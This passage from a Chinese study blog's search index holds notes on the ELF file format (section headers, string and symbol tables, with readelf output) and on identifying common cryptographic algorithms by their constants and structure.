表保存了所有的Phdr 对文件（以及内存镜像）中段的描述信息。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:3:4","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"ELF节头 ep@EP:/mnt/d/code/linux$ readelf -S main There are 29 section headers, starting at offset 0x19d8: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000000238 00000238 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000000254 00000254 0000000000000020 0000000000000000 A 0 0 4 [ 3] .note.gnu.build-i NOTE 0000000000000274 00000274 0000000000000024 0000000000000000 A 0 0 4 ...... Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), l (large), p (processor specific) 节头的数据结构： /* Section Header */ typedef struct { Elf32_Word sh_name; /* name - index into section header string table section */ Elf32_Word sh_type; /* type */ Elf32_Word sh_flags; /* flags */ Elf32_Addr sh_addr; /* address */ Elf32_Off sh_offset; /* file offset */ Elf32_Word sh_size; /* section size */ Elf32_Word sh_link; /* section header table index link */ Elf32_Word sh_info; /* extra information */ Elf32_Word sh_addralign; /* address alignment */ Elf32_Word sh_entsize; /* section entry size */ } Elf32_Shdr; typedef struct { Elf64_Half sh_name; /* section name */ Elf64_Half sh_type; /* section type */ Elf64_Xword sh_flags; /* section flags */ Elf64_Addr sh_addr; /* virtual address */ Elf64_Off sh_offset; /* file offset */ Elf64_Xword sh_size; /* section size */ Elf64_Half sh_link; /* link to another */ Elf64_Half sh_info; /* misc info */ Elf64_Xword sh_addralign; /* memory alignment */ Elf64_Xword sh_entsize; /* table entry size */ } Elf64_Shdr; 各个字段的解释如下: sh_type 字段 节区类型定义： 常用节区: ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:4:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"节与段 节，不是段。段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。节头对于程序的执行来说不是必需的，没有节头表，程序仍可以正常执行，因为节头表没有对程序的内存布局进行描述，对程序内存布局的描述是程序头表的任务。节头是对程序头的补充。readelf –l 命令可以显示一个段对应有哪些节，可以很直观地看到节和段之间的关系。 如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过 节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:4:1","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"字符串表（String Table） 字符串表节区包含以 NULL(ASCII 码 0)结尾的字符序列，通常称为字符串。ELF 目标文件通常使用字符串来表示符号和节区名称。对字符串的引用通常以字符串在字符串表中的下标给出。 比如下面这样： 那么偏移与他们对用的字符串如下表: 这样在ELF中引用字符串只需要给出一个数组下标即可。字符串表在ELF也以段的形式保存，常见的段名为”.strtab”或”.shstrtab”。这两个字符串表分别为字符串表(String Table)和段表字符串表(Header String Table)，字符串表保存的是普通的字符串，而段表字符串表用来保存段表中用到的字符串，比如段名。 在使用、分析字符串表时，要注意以下几点: 字符串表索引可以引用节区中任意字节。 字符串可以出现多次 可以存在对子字符串的引用 同一个字符串可以被引用多次。 字符串表中也可以存在未引用的字符串。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:5:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"符号表（Symbol Table） 目标文件的符号表中包含用来定位、重定位程序中符号定义和引用的信息。符号表 索引是对此数组的索引。索引 0 表示表中的第一表项，同时也作为 定义符号的索引。 /* Symbol Table Entry */ typedef struct elf32_sym { Elf32_Word st_name; /* name - index into string table */ Elf32_Addr st_value; /* symbol value */ Elf32_Word st_size; /* symbol size */ unsigned char st_info; /* type and binding */ unsigned char st_other; /* 0 - no defined meaning */ Elf32_Half st_shndx; /* section header index */ } Elf32_Sym; typedef struct { Elf64_Half st_name; /* Symbol name index in str table */ Elf_Byte st_info; /* type / binding attrs */ Elf_Byte st_other; /* unused */ Elf64_Quarter st_shndx; /* section index of symbol */ Elf64_Xword st_value; /* value of symbol */ Elf64_Xword st_size; /* size of symbol */ } Elf64_Sym; 各个字段的含义如下: 符号是对某些类型的数据或者代码（如全局变量或函数）的符号引用。例如，printf()函数会在动态符号表.dynsym 中存有一个指向该函数的符号条目。在大多数共享库和动态链接可执行文件中，存在两个符号表。如前面使用readelf –S 命令输出的内容中，可以看到有两个节：.dynsym和.symtab。 .dynsym 保存了引用来自外部文件符号的全局符号，如printf 这样的库函数，.dynsym 保存的符号是.symtab 所保存符号的子集，.symtab 中还保存了可执行文件的本地符号，如全局变量，或者代码中定义的本地函数等。因此，.symtab 保存了所有的符号，而.dynsym 只保存动态/全局符号。 因此，就存在这样一个问题：既然.symtab 中保存了.dynsym 中所有的符号，那么为什么还需要两个符号表呢？使用readelf –S 命令查看可执行文件的输出，可以看到一部分节被标记为了A（ALLOC）、WA（WRITE/ALLOC）或者AX（ALLOC/EXEC）。.dynsym 是被标记了ALLOC 的，而.symtab则没有标记。 ALLOC 表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。.dynsym 保存的符号只能在运行时被解析，因此是运行时动态链接器所需要的唯一符号。.dynsym 符号表对于动态链接可执行文件的执行来说是必需的，而.symtab 符号表只是用来进行调试和链接的，有时候为了节省空间，会将.symtab 符号表从生产二进制文件中删掉。 ep@EP:/mnt/d/code/linux$ readelf -s main Symbol table '.dynsym' contains 11 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (2) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND printf@GLIBC_2.2.5 (2) 4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.2.5 (2) 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.2.5 (2) 6: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND malloc@GLIBC_2.2.5 (2) 8: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable 9: 0000000000000000 0 FUNC GLOBAL DEFAULT UND sleep@GLIBC_2.2.5 (2) 10: 0000000000000000 0 FUNC WEAK DEFAULT UND __cxa_finalize@GLIBC_2.2.5 (2) Symbol table '.symtab' contains 67 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000238 0 SECTION LOCAL DEFAULT 1 2: 0000000000000254 0 SECTION LOCAL DEFAULT 2 3: 0000000000000274 0 SECTION LOCAL DEFAULT 3 4: 0000000000000298 0 SECTION LOCAL DEFAULT 4 5: 00000000000002b8 0 SECTION LOCAL DEFAULT 5 6: 00000000000003c0 0 SECTION LOCAL DEFAULT 6 7: 000000000000045c 0 SECTION LOCAL DEFAULT 7 8: 0000000000000478 0 SECTION LOCAL DEFAULT 8 9: 0000000000000498 0 SECTION LOCAL DEFAULT 9 10: 0000000000000558 0 SECTION LOCAL DEFAULT 10 11: 00000000000005d0 0 SECTION LOCAL DEFAULT 11 12: 00000000000005f0 0 SECTION LOCAL DEFAULT 12 13: 0000000000000650 0 SECTION LOCAL DEFAULT 13 14: 0000000000000660 0 SECTION LOCAL DEFAULT 14 15: 0000000000000864 0 SECTION LOCAL DEFAULT 15 16: 0000000000000870 0 SECTION LOCAL DEFAULT 16 17: 00000000000008a4 0 SECTION LOCAL DEFAULT 17 18: 00000000000008e0 0 SECTION LOCAL DEFAULT 18 19: 0000000000200d98 0 SECTION LOCAL DEFAULT 19 20: 0000000000200da0 0 SECTION LOCAL DEFAULT 20 21: 0000000000200da8 0 SECTION LOCAL DEFAULT 21 22: 0000000000200f98 0 SECTION LOCAL DEFAULT 22 23: 0000000000201000 0 SECTION LOCAL DEFAULT 23 24: 0000000000201010 0 SECTION LOCAL DEFAULT 24 25: 0000000000000000 0 SECTION LOCAL DEFAULT 25 26: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 27: 0000000000000690 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones 28: 00000000000006d0 0 FUNC LOCAL DEFAULT 14 register_tm_clones 29: 0000000000000720 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux 30: 0000000000201010 1 OBJECT LOCAL DEFAULT 24 completed.7698 31: 0000000000200da0 0 OBJECT LOCAL DEFAULT 20 __do_global_dtor","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:6:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"参考 https://blog.csdn.net/xuehuafeiwu123/article/details/72963229 https://felixzhang00.github.io/2016/12/24/2016-12-24-ELF%E6%96%87%E4%BB%B6%E8%A3%85%E8%BD%BD%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B%E5%8F%8Ahook%E5%8E%9F%E7%90%86/ ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:7:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"https://blog.51cto.com/13479739/2484361 有关13种常见密码学算法的一个系列 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:0:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"分组加密算法 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:1:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"DES 长度：8字节，加密轮数：16 https://xz.aliyun.com/t/6748 识别：S盒，IP置换表，P置换表 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:1:1","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"AES AES 密钥长度(32位比特字) 分组长度(32位比特字) 加密轮数 AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 加密轮数：10-14 https://www.anquanke.com/post/id/85656 识别：S盒(但是S盒可能是动态生成的)、列混合(矩阵乘法{ 2, 3, 1, 1, 1, 2, 3, 1, 1, 1, 2, 3, 3, 1, 1, 2})、密钥生成时的轮常量(01000000, 02000000, 04000000, 08000000, 10000000) ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:1:2","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"RC6 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:1:3","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"序列密码 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:2:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"RC4 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:2:1","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"Rabbit 主要有几个常数: a0 = a3 = a6 = 0x4d34d34d a1 = a4 = a7 = 0xd34d34d3 a2 = a5 = 0x34d34d34 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:2:2","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"Hash算法 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:3:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"Md5 https://blog.csdn.net/u012611878/article/details/54000607 对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充：如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为Nx512+448(bit)； 第二步、记录信息长度：用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数）：标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。 第四步、四轮循环运算：循环的次数是分组的个数（N+1） ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:3:1","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"SHA1 SHA1算法的输入是最大长度小于2^64比特的消息，输入消息以512比特的分组为单位处理，输出是160比特的消息摘要。SHA1的初始化散列值： H0 = 0x67452301 H1 = 0xEFCDAB89 H2 = 0x98BADCFE H3 = 0x10325476 H4 = 0xC3D2E1F0 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:3:2","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"SHA256 SHA256算法的输入是最大长度小于2^64比特的消息，输出是256比特的消息摘要，输入以512比特的分组为单位处理。 SHA256中用到两种常量： 8个哈希初值=\u003e自然数中前8个质数（2,3,5,7,11,13,17,19）的平方根的小数部分取前32bit ： h0 := 0x6a09e667 h1 := 0xbb67ae85 h2 := 0x3c6ef372 h3 := 0xa54ff53a h4 := 0x510e527f h5 := 0x9b05688c h6 := 0x1f83d9ab h7 := 0x5be0cd19 64个哈希常量=\u003e自然数中前64个质数(2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…)的立方根的小数部分取前32bit ： 428a2f98 71374491 b5c0fbcf e9b5dba5 3956c25b 59f111f1 923f82a4 ab1c5ed5 …… ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:3:3","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"SHA512 SHA256算法的输入是最大长度小于2^128比特的消息，输出是512比特的消息摘要，输入以1024比特的分组为单位处理。 H(0)0 = 6a09e667f3bcc908 H(0)1 = bb67ae8584caa73b H(0)2 = 3c6ef372fe94f82b H(0)3 = a54ff53a5f1d36f1 H(0)4 = 510e527fade682d1 H(0)5 = 9b05688c2b3e6c1f H(0)6 = 1f83d9abfb41bd6b H(0)7 = 5be0cd19137e2179 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:3:4","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"非对称加密 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"DH密钥交换 http://wsfdl.com/algorithm/2016/02/04/%E7%90%86%E8%A7%A3Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E7%AE%97%E6%B3%95.html ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:1","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"RSA https://www.cnblogs.com/P201521440001/p/11439344.html#cjsEEbwk ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:2","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"ElGamal https://www.jianshu.com/p/cd36ae7dca47 安全基础：离散对数求解的困难性 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:3","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"椭圆曲线公钥加密体制 https://xz.aliyun.com/t/6295 有限域GF(p)上的椭圆曲线： $y^3 \\equiv x^3 + ax + b(mod;p)$ p是大素数，a、b、x和y均在有限域GF(p)中，且满足$4a^3 + 27b^2(mod;p) \\neq 0$，通常用$E_p(a, b)$表示。 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:4","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"MH背包公钥加密体制 基础：超递增序列背包问题的解容易求得。 密钥生成：$A={a_1, a_2, …, a_n}$是一个超递增整数序列，取素数p、b, $p \u003e a_1+a_2+…+a_n, 1\u003c=b\u003c=p-1$，计算$t_i \\equiv ba_i(mod;p), 1\u003c=i\u003c=n$则公钥为$t=(t_1, t_2, …, t_n)$和p,私钥为A和b 加密算法：设明文块二进制表示为$m=m_1m_2…m_n$，则使用加密算法$c \\equiv t_1m_1+t_2m_2+…+t_nm_n(mod;p)$ 解密算法：通过公式$S \\equiv b^-1c(mod;p)$计算得到S, 对超递增序列A以及整数S，利用超递增背包问题求解。 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:5","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"Rabin公钥加密体制 密钥生成：随机选取两个大素数p,q,并且$p \\equiv 3(mod;4)$,$q \\equiv 3(mod;4)$,将p,q作为私钥，$n = p*q$作为公钥 加密算法：设明文块为m(m\u003cn)，运用公式$c \\equiv m^2(mod;n)$进行加密 https://xz.aliyun.com/t/5113 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:4:6","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"分组密码工作模式 电子密码本模式ECB 密码分组链接模式CBC 密码反馈模式CFB 输出反馈模式OFB 计数器模式(CTR) ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:5:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"填充方式 转载：https://www.jianshu.com/p/fbfc886a9f73 一个记录，侵删。 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:6:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"位填充 位填充可用于任意长度的信息。 在原始信息后添加一个“设定”位（“1”），再添加“重设”位（“0”）至要求的长度。“重设”位（“0”）的数量取决于原始信息末尾到块边缘的距离。其中填充的0的个数可以为0。 例如： 一段23位的信息可填充9位以填满一个32位的块 … | 1011 1001 1101 0100 0010 0111 0000 0000 | 位填充在很多哈希函数（例如MD5和SHA）中作为两步填充方案中的第一步。 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:6:1","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"字节填充 字节填充可用于可编码为整数字节（一个字节为8位）大小的信息。 ANSI X.923 块的大小为8字节，需要填充4字节 … | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 04 